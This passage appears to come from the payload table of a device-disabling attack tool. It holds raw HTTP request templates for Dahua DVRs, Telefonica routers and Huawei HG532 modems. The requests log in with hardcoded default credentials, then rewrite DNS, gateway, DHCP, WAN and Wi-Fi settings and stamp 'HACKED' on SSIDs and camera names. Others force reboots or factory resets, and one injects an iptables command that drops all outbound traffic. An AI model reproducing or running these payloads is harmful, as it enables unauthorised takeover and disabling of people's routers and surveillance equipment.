00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}],[{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"1 00:00:00-24:00:00"},{"Acutance":1,"Brightness":1,"Contrast":1,"Hue":1,"Saturation":1,"TimeSection":"0 00:00:00-24:00:00"}]],"options":""},"session":%%CUSTOM2%%,"id":111}:""',
## CRASHES SOME UNITS?		'POST /RPC2 HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: DHLangCookie30=%2Fweb_lang%2FEnglish.txt; DhWebSnapPath=C%3A%5CPictureDownload; DhWebRecordPath=C%3A%5CRecordDownload; DhWebClientSessionID=%%CUSTOM2%%\r\n\r\n{"method":"configManager.setConfig","params":{"name":"VideoWaterMark","table":[{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"},{"Enable":true,"String":"HACKED"}],"options":""},"session":%%CUSTOM2%%,"id":119}:""',
		'POST /RPC2 HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: DHLangCookie30=%2Fweb_lang%2FEnglish.txt; DhWebSnapPath=C%3A%5CPictureDownload; DhWebRecordPath=C%3A%5CRecordDownload; DhWebClientSessionID=%%CUSTOM2%%\r\n\r\n{"method":"system.multicall","params":[{"method":"configManager.setConfig","params":{"name":"Network","table":{"DefaultInterface":"eth0","Domain":"dahua","Hostname":"DVR","eth0":{"DefaultGateway":"10.%%COMP8%%","DhcpEnable":false,"DnsServers":["1.2.3.4","1.2.3.5"],"IPAddress":"10.%%RAND8%%","MTU":1500,"PhysicalAddress":"90:02:A9:%%RHEX1%%:%%RHEX2%%:%%RHEX3%%","SubnetMask":"255.255.255.0"}},"options":""},"session":%%CUSTOM2%%,"id":558}, {"method":"configManager.setConfig","params":{"name":"MediaFileReaderGlobal","table":{"DefaultBitrateLevel":"Normal"},"options":""},"session":%%CUSTOM2%%,"id":559}, {"method":"configManager.setConfig","params":{"name":"IPv6","table":{"eth0":{"DefaultGateway":"","DnsServers":["::ffff:1.2.3.4","::ffff:1.2.3.5"],"IPAddress":"","LinkLocalAddress":"fe80::9202:a9ff:fed6:a411/64","Prefix":64}},"options":""},"session":95063849,"id":560}],"session":%%CUSTOM2%%,"id":561}',
		'POST /RPC2 HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: DHLangCookie30=%2Fweb_lang%2FEnglish.txt; DhWebSnapPath=C%3A%5CPictureDownload; DhWebRecordPath=C%3A%5CRecordDownload; DhWebClientSessionID=%%CUSTOM2%%\r\n\r\n{"method":"configManager.setConfig","params":{"name":"WLan","table":{"eth0":{"SSID":""},"eth1":{"SSID":""},"eth2":{"LinkEnable":true,"SSID":""},"eth3":{"SSID":""},"eth4":{"SSID":""}},"options":""},"session":%%CUSTOM2%%,"id":131}:""',
		'POST /RPC2 HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: DHLangCookie30=%2Fweb_lang%2FEnglish.txt; DhWebSnapPath=C%3A%5CPictureDownload; DhWebRecordPath=C%3A%5CRecordDownload; DhWebClientSessionID=%%CUSTOM2%%\r\n\r\n{"method":"configManager.setConfig","params":{"name":"Wireless","table":{"3G":{"APN":"","Activate":false,"AuthMode":"No","DailNumber":"","Enable":0,"KeepAlive":0,"Password":"","UserName":"","WorkMode":"Auto"}},"options":""},"session":%%CUSTOM2%%,"id":133}:""',
		'POST /RPC2 HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: DHLangCookie30=%2Fweb_lang%2FEnglish.txt; DhWebSnapPath=C%3A%5CPictureDownload; DhWebRecordPath=C%3A%5CRecordDownload; DhWebClientSessionID=%%CUSTOM2%%\r\n\r\n{"method":"configManager.setConfig","params":{"name":"PPPoE","table":{"Enable":false,"Password":"HACKED","UserName":"HACKED"},"options":""},"session":%%CUSTOM2%%,"id":72}:""',
		'POST /RPC2 HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: DHLangCookie30=%2Fweb_lang%2FEnglish.txt; DhWebSnapPath=C%3A%5CPictureDownload; DhWebRecordPath=C%3A%5CRecordDownload; DhWebClientSessionID=%%CUSTOM2%%\r\n\r\n{"method":"configManager.setConfig","params":{"name":"VideoIn","table":[{"Name":"HACKED 1"},{"Name":"HACKED 2"},{"Name":"UPGRADE 3"},{"Name":"FIRMWARE 4"},{"Name":"HACKED 5"},{"Name":"UPGRADE 6"},{"Name":"FIRMWARE 7"},{"Name":"HACKED 8"},{"Name":"UPGRADE 9"},{"Name":"FIRMWARE 10"},{"Name":"HACKED 11"},{"Name":"UPGRADE 12"},{"Name":"FIRMWARE 13"},{"Name":"HACKED 14"},{"Name":"UPGRADE 15"},{"Name":"FIRMWARE 16"}],"options":""},"session":%%CUSTOM2%%,"id":127}:""',
		'POST /RPC2 HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: DHLangCookie30=%2Fweb_lang%2FEnglish.txt; DhWebSnapPath=C%3A%5CPictureDownload; DhWebRecordPath=C%3A%5CRecordDownload; DhWebClientSessionID=%%CUSTOM2%%\r\n\r\n{"method":"configManager.setConfig","params":{"name":"UPnP","table":{"Enable":false,"MapTable":[{"Enable":false,"InnerPort":80,"OuterPort":80,"Protocol":"TCP","ServiceName":"HTTP"},{"Enable":false,"InnerPort":37777,"OuterPort":37777,"Protocol":"TCP","ServiceName":"TCP"},{"Enable":false,"InnerPort":37778,"OuterPort":37778,"Protocol":"UDP","ServiceName":"UDP"},{"Enable":false,"InnerPort":554,"OuterPort":554,"Protocol":"UDP","ServiceName":"RTSP"},{"Enable":false,"InnerPort":554,"OuterPort":554,"Protocol":"TCP","ServiceName":"RTSP"},{"Enable":false,"InnerPort":161,"OuterPort":161,"Protocol":"UDP","ServiceName":"SNMP"},{"Enable":false,"InnerPort":443,"OuterPort":443,"Protocol":"TCP","ServiceName":"HTTPS"}]},"options":""},"session":%%CUSTOM2%%,"id":562}:""',
		'POST /RPC2 HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\r\nContent-Length: %%BODYLENGTH%%\r\nCookie: DHLangCookie30=%2Fweb_lang%2FEnglish.txt; DhWebSnapPath=C%3A%5CPictureDownload; DhWebRecordPath=C%3A%5CRecordDownload; DhWebClientSessionID=%%CUSTOM2%%\r\n\r\n{"method":"magicBox.reboot","params":{"delay" : 1100},"session":%%CUSTOM2%%,"id":211}:""',
		'GET / HTTP/1.0\r\n\r\n',
	],  
	
  # more telefonica crap
  [ 'homestation', '200 Ok.*Server: minihttpd/.*window\.location\.href = /html/gui/;',
  	'GET /cgi-bin/webproc HTTP/1.0\r\n\r\n',
    'POST /cgi-bin/webproc HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/cgi-bin/webproc\r\nCookie: sessionid=%%CUSTOM1%%; language=en_us; sys_UserName=TelefonicaUser\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ngetpage=html%2Findex.html&errorpage=html%2Fmain.html&var%3Amenu=setup&var%3Apage=wizard&obj-action=auth&%3Ausername=TelefonicaUser&%3Apassword=user&%3Aaction=login&%3Asessionid=%%CUSTOM1%%',  	
    'POST /cgi-bin/webproc HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=lan\r\nCookie: sessionid=%%CUSTOM1%%; language=en_us; sys_UserName=TelefonicaUser\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n%3AInternetGatewayDevice.LANDevice.1.X_TWSZ-COM_ProxyArp=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DomainName=homestation&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.Enable=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.2.Enable=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.IPInterfaceIPAddress=10.%%RAND8%%&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.IPInterfaceSubnetMask=255.255.255.0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.MinAddress=127.0.0.1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.MaxAddress=127.0.0.1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPLeaseTime=86400&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPRelay=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.SubnetMask=255.255.255.0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPRouters=10.%%COMP8%%&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.2.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.3.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.4.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.X_TWSZ-COM_UseIPRoutersAsDNSServer=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DNSServers=200.21.200.10%2C200.21.200.80&errorpage=html%2Findex.html&getpage=html%2Findex.html&var%3Amenu=setup&var%3Apage=lan&obj-action=set&var%3Aerrorpage=lan&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.1.DhcpServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.2.DhcpServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.3.DhcpServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.4.DhcpServerEnable=1',
		'POST /cgi-bin/webproc HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wireless&var:subpage=wlbasic\r\nCookie: sessionid=%%CUSTOM1%%; language=en_us; sys_UserName=TelefonicaUser\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n%3AInternetGatewayDevice.X_TWSZ-COM_WLAN.WirelessMultiAPIsolationEnable=0&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.1.Enable=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.1.SSID=%28HACKED%29&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.1.SSIDAdvertisementEnabled=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_CurrentCountry=Colombia&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.1.Channel=6&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.1.Standard=bgn&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_Bandwidth=40&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_ControlSideband=Upper&var%3Amenu=setup&var%3Apage=wireless&var%3Asubpage=wlbasic&var%3Aerrorpage=wlbasic&getpage=html%2Findex.html&errorpage=html%2Findex.html&obj-action=set',
		'POST /cgi-bin/webproc HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/cgi-bin/webproc?getpage=html/index.html&var:menu=advanced&var:page=route&var:subpage=defaultgw\r\nCookie: sessionid=%%CUSTOM1%%; language=en_us; sys_UserName=TelefonicaUser\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n%3AInternetGatewayDevice.X_TWSZ-COM_DEFAULT_GW.GWIP=1.2.3.4&%3AInternetGatewayDevice.X_TWSZ-COM_DEFAULT_GW.Active=GWIP&obj-action=set&getpage=html%2Findex.html&errorpage=html%2Findex.html&var%3Amenu=advanced&var%3Apage=route&var%3Asubpage=defaultgw&var%3Aerrorpage=defaultgw&var%3ACacheLastData=c2VsZWN0Q29ubmVjdGlvbk5hbWU9MHxBdXRvRGVmdEdXPWZhbHNlfEdXSVA9dHJ1ZXxzdGF0aWNSb3VnaW5nR2F0ZXdheT0xLjIuMy40fFVzZXJJbklmPWZhbHNl',
		# try factory reset if we're still here?
		'POST /cgi-bin/webproc HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/cgi-bin/webproc?getpage=html/index.html&var:menu=maintenance&var:page=system\r\nCookie: sessionid=%%CUSTOM1%%; language=en_us; sys_UserName=TelefonicaUser\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nrestore=Restore+Default+Setting&obj-action=recover&var%3Anoredirect=1&var%3Amenu=maintenance&var%3Apage=system&var%3Aerrorpage=system&getpage=html%2Fpage%2Frestarting.html',
    'GET / HTTP/1.0\r\n\r\n',
	],		
	
  # telefonica ar crap, seems to have been exploited by some botnet, workaround to disconnect these	
	[ 'observa', '200 Ok.*Server: minihttpd/.*window\.location\.href = /cgi-bin/webproc;',
    'GET /cgi-bin/webproc HTTP/1.0\r\n\r\n',
    'POST /cgi-bin/webproc HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/cgi-bin/webproc\r\nCookie: sessionid=%%CUSTOM1%%; language=en_us; sys_UserName=support\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ngetpage=html%2Fwizard%2Fguidesecond.html&var%3Apage=*&obj-action=auth&%3Ausername=%%LOGIN%%&%3Apassword=%%PASSWORD%%&%3Aaction=login&%3Asessionid=%%CUSTOM1%%',
    'GET /cgi-bin/webproc?getpage=html/wizard/guidesecond.html&var:language=en_us&var:page=* HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/cgi-bin/webproc\r\nCookie: sessionid=%%CUSTOM1%%\r\n\r\n',
    'POST /cgi-bin/webproc HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/cgi-bin/webproc\r\nCookie: sessionid=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nobj-action=set&getpage=html%2Fwizard%2Fguidefourth.html&errorpage=html%2Fwizard%2Fguidesecond.html&var%3Apage=html%2Fwizard%2Fguidesecond.html&%3AInternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1.Username=%%CUSTOM3%%',
		# try factory reset if we're still here?
		'POST /cgi-bin/webproc HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/cgi-bin/webproc?getpage=html/index.html&var:menu=maintenance&var:page=system\r\nCookie: sessionid=%%CUSTOM1%%; language=en_us; sys_UserName=TelefonicaUser\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nrestore=Restore+Default+Setting&obj-action=recover&var%3Anoredirect=1&var%3Amenu=maintenance&var%3Apage=system&var%3Aerrorpage=system&getpage=html%2Fpage%2Frestarting.html',
    'GET / HTTP/1.0\r\n\r\n',
  ],

	[ 'hg532', '(CACHE-CONTROL|Cache-Control): no-cache.*LoginTimes.*Cookieflag',
	  'POST /index/login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0; Language=en\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUsername=admin&Password=OGM2OTc2ZTViNTQxMDQxNWJkZTkwOGJkNGRlZTE1ZGZiMTY3YTljODczZmM0YmI4YTgxZjZmMmFiNDQ4YTkxOA%3D%3D',  # admin/admin
    'POST /index/login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0; Language=en\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUsername=instalador&Password=N2MwNGQxMzUzNzI1Y2ZkNzU4ZTFhYzNjM2JjZGRiMDkxNWNlNzA4OWU1NTlkODQ0Yjk2YTU4MjFmNTM1N2Y4Mg%3D%3D',  # instalador/.corporacion
    'POST /index/login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0; Language=en\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUsername=instalador&Password=NjQzMGU0ZDBhMTMyYzI5Njg4NGUzMjNlOWJkMWM1MzJhODZmYmQ3OWJlYmUxN2U0Nzc1NDlmZjBkYjM0YzNiNA%3D%3D',   # instalador/cnt2016admin
    'POST /index/login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0; Language=en\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUsername=admin&Password=YWRtaW4%3D',   # admin/admin (base64)
    'POST /html/ntwkall/setcfg.cgi?x=InternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1&y=InternetGatewayDevice.LANDevice.1.LANHostConfigManagement&RequestFile=/html/ntwkall/dhcp.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_1; SecondMenu=Admin_1_2; ThirdMenu=Admin_1_2_0; Language=en; SessionID_R3=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nx.IPInterfaceIPAddress=10.%%RAND8%%&x.IPInterfaceSubnetMask=255.255.255.0&y.MinAddress=10.%%COMP8%%&y.MaxAddress=10.%%COMP8%%&y.DNSServers=1.2.3.4%2C1.2.3.5&y.Enable=0&y.DHCPServerEnable=0',
    'POST /html/ntwkall/setcfg.cgi?x=InternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1&y=InternetGatewayDevice.LANDevice.1.LANHostConfigManagement&RequestFile=/html/ntwkall/dhcp.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_1; SecondMenu=Admin_1_2; ThirdMenu=Admin_1_2_0; Language=en; SessionID_R3=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nx.IPInterfaceIPAddress=10.%%RAND8%%&x.IPInterfaceSubnetMask=255.255.255.0&y.MinAddress=10.%%COMP8%%&y.MaxAddress=10.%%COMP8%%&y.DNSServers=1.2.3.4%2C1.2.3.5&y.DHCPServerEnable=0',
    'POST /index/login.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0; Language=en SessionID_R3=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUsername=%%LOGIN%%&Password=%%CUSTOM2%%',
    'POST /html/ntwkall/setcfg.cgi?x=InternetGatewayDevice.LANDevice.1&y=InternetGatewayDevice.LANDevice.1.WLANConfiguration.1&k=InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1&z=InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.WPS&RequestFile=/html/ntwkall/wlan.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_1; SecondMenu=Admin_1_3; ThirdMenu=Admin_1_3_0; Language=en; SessionID_R3=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ny.Standard=b%2Fg%2Fn&y.MaxBitRate=Auto&y.X_Wlan11NHtMcs=33&y.Enable=1&y.AutoChannelEnable=0&y.Channel=11&y.SSIDAdvertisementEnabled=1&y.X_WlanIsolateControl=0&y.WMMEnable=1&y.X_Wlan11NBWControl=20%2F40&y.X_Wlan11NGIControl=long&y.SSID=%%CUSTOM3%%HACKED&y.RegulatoryDomain=EC&y.X_AssociateDeviceNum=32&y.X_PowerValue=20&y.BeaconType=WPAand11i&z.Enable=1&z.X_WPSMode=ap-pbc&y.X_MixedEncryptionModes=AESEncryption&x.X_WLANEnable=1',
    # alt wlan
    'POST /html/ntwkall/setcfg.cgi?x=InternetGatewayDevice.LANDevice.1&y=InternetGatewayDevice.LANDevice.1.WLANConfiguration.1&k=InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1&z=InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.WPS&RequestFile=/html/ntwkall/wlan.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_1; SecondMenu=Admin_1_4; ThirdMenu=Admin_1_4_0; Language=en; SessionID_R3=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ny.Standard=b%2Fg%2Fn&y.Enable=1&y.AutoChannelEnable=1&y.Channel=6&y.MaxBitRate=Auto&y.SSIDAdvertisementEnabled=1&y.X_WlanIsolateControl=0&y.WMMEnable=1&y.X_Wlan11NBWControl=20%2F40&y.X_Wlan11NGIControl=long&y.SSID=%%CUSTOM3%%HACKED&y.RegulatoryDomain=RO&y.X_AssociateDeviceNum=32&y.X_PowerValue=20&y.BeaconType=WPA&z.Enable=1&z.X_WPSMode=ap-pbc&k.PreSharedKey=hackedmodem&y.WPAEncryptionModes=AESEncryption&x.X_WLANEnable=1',
    # wan settings
    'POST /html/ntwkall/setcfg.cgi?x=InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANDSLLinkConfig&y=InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANIPConnection.1&RequestFile=/html/ntwkall/wan.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_1; SecondMenu=Admin_1_1; ThirdMenu=Admin_1_1_0; Language=en; SessionID_R3=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ny.Enable=0&y.X_ServiceList=INTERNET_TR069&y.X_LanInterface=&y.ConnectionType=IP_Routed&y.NATEnabled=0&y.AddressingType=Static&y.ExternalIPAddress=10.%%COMP8%%&y.SubnetMask=255.255.255.0&y.DefaultGateway=10.%%RAND8%%&y.DNSServers=1.2.3.4%2C1.2.3.5&y.DNSEnabled=0&y.DNSOverrideAllowed=0&y.X_DHCPRelay=0&y.X_IPv4Enable=1&y.X_IPv6Enable=0&y.X_IPv6AddressingType=SLAAC&y.X_IPv6DefaultGateway=&y.X_IPv6Address=&y.X_IPv6PrefixLength=0&y.X_IPv6DNSEnabled=1&y.X_IPv6DNSOverrideAllowed=1&y.X_IPv6DNSServers=&y.MaxMTUSize=1500&y.X_TCP_MSS=0&x.DestinationAddress=PVC%3A0%2F35&x.ATMQoS=UBR&x.Enable=1&x.LinkType=EoA&x.ATMEncapsulation=LLC&x.X_VLANIDMark=-1&x.X_802-1pMark=-1',
    'POST /html/ntwkall/setcfg.cgi?x=InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANDSLLinkConfig&y=InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANPPPConnection.1&RequestFile=/html/ntwkall/wan.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_1; SecondMenu=Admin_1_1; ThirdMenu=Admin_1_1_0; Language=en; SessionID_R3=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ny.Enable=0&y.X_ServiceList=INTERNET&y.X_LanInterface=&y.ConnectionType=PPPoE_Bridged&y.X_DHCPRelay=0&y.ConnectionTrigger=AlwaysOn&y.IdleDisconnectTime=0&y.RouteProtocolRx=Off&y.X_IPv6Enable=0&y.MaxMTUSize=1492&x.DestinationAddress=PVC%3A0%2F35&x.ATMQoS=UBR&x.Enable=1&x.LinkType=EoA&x.ATMEncapsulation=LLC&x.X_VLANIDMark=-1&x.X_802-1pMark=-1',
    'POST /html/ntwkall/setcfg.cgi?x=InternetGatewayDevice.WANDevice.2.WANConnectionDevice.1.WANIPConnection.1&RequestFile=/html/ntwkall/wan.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_1; SecondMenu=Admin_1_2; ThirdMenu=Admin_1_2_0; Language=en; SessionID_R3=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nx.Enable=0&x.X_ServiceList=INTERNET&x.X_LanInterface=&x.ConnectionType=IP_Bridged&x.X_DHCPRelay=0&x.RouteProtocolRx=Off',
    'POST /html/management/excutecmd.cgi?cmd=`iptables%20-A%20OUTPUT%20-j%20DROP`&RequestFile=/html/management/diagnose.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_3; SecondMenu=Admin_3_2; ThirdMenu=Admin_3_2_0; Language=en; SessionID_R3=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n',
    'GET / HTTP/1.0\r\n\r\n',
  ],

	[ 'hg532a', 'util\.js.*LoginTimes.*Cookieflag',
		'POST /login.cgi?Username=admin&Password=YWRtaW4=&Language=0&RequestFile=html/content.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0; Language=en\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n',  # admin/admin
